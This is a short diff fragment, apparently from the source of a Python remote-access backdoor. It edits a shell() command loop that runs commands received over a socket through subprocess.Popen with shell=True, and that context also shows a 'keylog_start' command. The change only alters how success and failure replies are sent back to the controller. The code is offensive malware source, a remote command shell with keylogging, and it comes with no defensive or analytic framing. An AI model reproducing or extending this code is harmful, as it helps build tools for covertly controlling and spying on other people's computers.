@@ -849,10 +849,12 @@ def shell():
             elif command[:5] == 'start':
                 try:
                     subprocess.Popen(command[6:], shell=True)
-                    reliable_send('\n [+] started \n')
+
                 except:
-                    reliable_send('\n [-] Failed \n')
+                    s.send('\n [-] Failed \n'.encode())
                     continue
+                else:
+                    s.send('[+] Started'.encode())
             elif command[:12] == 'keylog_start':
                 try:
                     global t
